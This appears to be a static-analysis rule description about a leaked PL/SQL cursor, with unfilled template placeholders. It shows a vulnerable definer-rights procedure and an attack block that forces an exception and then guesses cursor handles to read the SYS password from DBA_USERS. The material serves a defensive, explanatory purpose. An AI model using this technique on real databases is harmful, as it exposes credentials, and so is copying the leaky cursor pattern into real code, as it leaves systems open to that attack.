<h2>ABSTRACT</h2>
<p>
  The cursor can potentially be used by a lower-privileged user.
</p>
<h2>EXPLANATION</h2>
<p>
  The cursor can potentially be used to access unauthorized information.<p><br />In this case, there are program paths on which the cursor allocated in <Replace key="FirstTraceLocation.file"/> at line <Replace key="FirstTraceLocation.line"/> is not always closed.<br /></p><br />Resource leaks have at least two common causes:<br /><br />- Error conditions and other exceptional circumstances.<br /><br />- Confusion over which part of the program is responsible for releasing the resource.<br /><br />In SQL, cursors have the privileges associated with the code that created them. If a less privileged user can capture the leaked cursor, it can be used to view unauthorized records.<br /><br />In addition, most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker might be able to launch a denial of service by depleting the resource pool.<br /><br /><b>Example:</b> The <code>PWD_COMPARE</code> procedure can be used by code that does not have access to <code>sys.dba_users</code> to check a user's password.<br /><br /><pre><br />CREATE or REPLACE procedure PWD_COMPARE(p_user VARCHAR, p_pwd VARCHAR)<br />  AUTHID DEFINED <br />IS<br />  cursor INTEGER;<br />  ...<br />BEGIN<br />  IF p_user != 'SYS' THEN<br />    cursor := DBMS_SQL.OPEN_CURSOR;<br />    DBMS_SQL.PARSE(cursor, 'SELECT password FROM SYS.DBA_USERS WHERE username = :u', DBMS_SQL.NATIVE);<br />    DBMS_SQL.BIND_VARIABLE(cursor, ':u', p_user);<br />    ...<br />  END IF;<br />END PWD_COMPARE;<br /></pre><br /><br />If the attacker can cause an excption, they can capture the cursor and gain access to unauthorized information, such as the <code>sys</code> password. One way to cause an exception is to pass an overly long argument to <code>p_user</code>. Once the attacker knows that the cursor has leaked, they just have to guess the cursor and assign new bind variables.<br /><br /><pre><br />DECLARE<br />  x VARCHAR(32000);<br />  i INTEGER;<br />  j INTEGER;<br />  r INTEGER;<br />  pwd VARCHAR2(30);<br />BEGIN<br />  FOR i IN 1..10000 LOOP<br />    x:='b' || x;<br />  END LOOP;<br />  SYS.PWD_COMPARE(x,'pwd');<br />EXCEPTION WHEN OTHERs THEN<br />  FOR j IN 1..10000<br />    DBMS_SQL.BIND_VARIABLE(j, ':u', 'SYS');<br />    DBMS_SQL.DEFINE_COLUMN(j, 1, pwd, 30);<br />    r := DBMS_SQL.EXECUTE(j);<br />    IF DBMS_SQL.FETCH_ROWS(j) &gt; 0 THEN<br />      DBMS_SQL.COLUMN_VALUE(j, 1, pwd);<br />      EXIT;<br />    END IF;<br />  END LOOP;<br />  ...<br />END;<br /></pre>
</p>
<h2>REFERENCES</h2>
<p>
  
</p>